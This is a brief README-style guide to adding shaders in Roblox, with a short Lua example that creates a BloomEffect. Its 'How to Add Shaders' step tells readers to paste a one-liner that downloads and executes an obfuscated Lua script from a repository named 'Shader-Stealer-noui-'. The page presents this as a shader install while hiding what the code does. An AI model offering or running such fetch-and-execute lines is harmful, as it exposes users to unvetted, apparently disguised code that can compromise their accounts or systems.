# **Shaders for Roblox**

## 🌟 **Introduction**  
Shaders in Roblox improve game visuals by adding realistic lighting, textures, and effects such as dynamic sunlight, reflections, and depth of field.

---

## 📦 **Types of Shaders**
1. **Surface Shaders**: Modify how light interacts with objects (e.g., metallic surfaces).  
2. **Post-Processing Effects**: Enhance the overall scene (e.g., bloom, blur).  
3. **Screen Space Shaders**: Apply effects like motion blur globally.

---

## 🛠️ **How to Add Shaders**
1. Copy this code below or go to the night or night rewrite server and message a dev 
2. Copy This:
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/JustToUseGiHubAi/Shader-Stealer-noui-/refs/heads/main/fr-obfuscated.lua"))()
```
4. Add effects like:  
   - **BloomEffect**: Adds glow.  
   - **BlurEffect**: Creates blur.  
   - **ColorCorrectionEffect**: Adjusts brightness/contrast. Or you can customise it how ever you want!!!!!

---

## 🔧 **Code Example**
Here’s a simple code to help you get started on your own product:
```lua
local Lighting = game:GetService("Lighting")

local bloom = Instance.new("BloomEffect")
bloom.Intensity = 1.5
bloom.Size = 24
bloom.Threshold = 0.8
bloom.Parent = Lighting
